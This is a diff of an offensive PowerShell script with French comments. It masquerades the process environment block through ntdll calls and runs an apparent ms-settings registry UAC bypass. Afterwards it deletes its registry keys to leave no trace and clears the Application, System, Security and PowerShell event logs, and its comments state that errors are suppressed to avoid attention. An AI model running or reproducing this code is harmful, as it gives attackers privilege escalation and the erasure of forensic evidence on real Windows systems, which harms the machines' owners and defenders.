@@ -254,7 +254,6 @@ function Masquerade-PEB {
     } else {
         [Ntdll]::RtlLeaveCriticalSection($PEBFlags.FastPebLock64)
     } echo "[!] RtlLeaveCriticalSection --> &Peb->FastPebLock`n"
-
 }
 
 function Bypass {
@@ -291,21 +290,6 @@ function Bypass {
 
         # Attends un court instant pour permettre l'exécution.
         Start-Sleep -Seconds 3
-    }
-    catch {
-        # Ne pas afficher explicitement l'erreur pour éviter d'attirer l'attention.
-        return
-    }
-    finally {
-        # Nettoie les clés de registre créées pour éviter toute trace persistante.
-        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue
-    }
-
-}
-
-# Exécute la fonction
-Bypass
 # Liste des journaux que vous souhaitez effacer
 $logsToClear = @("Application", "System", "Security", "Windows Powershell")  # Ajoutez ou supprimez les noms des journaux ici
 
@@ -319,3 +303,17 @@ foreach ($logName in $logsToClear) {
         Write-Host "Le journal '$logName' n'existe pas ou n'est pas accessible."
     }
 }
+    }
+    catch {
+        # Ne pas afficher explicitement l'erreur pour éviter d'attirer l'attention.
+        return
+    }
+    finally {
+        # Nettoie les clés de registre créées pour éviter toute trace persistante.
+        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# Exécute la fonction
+Bypass
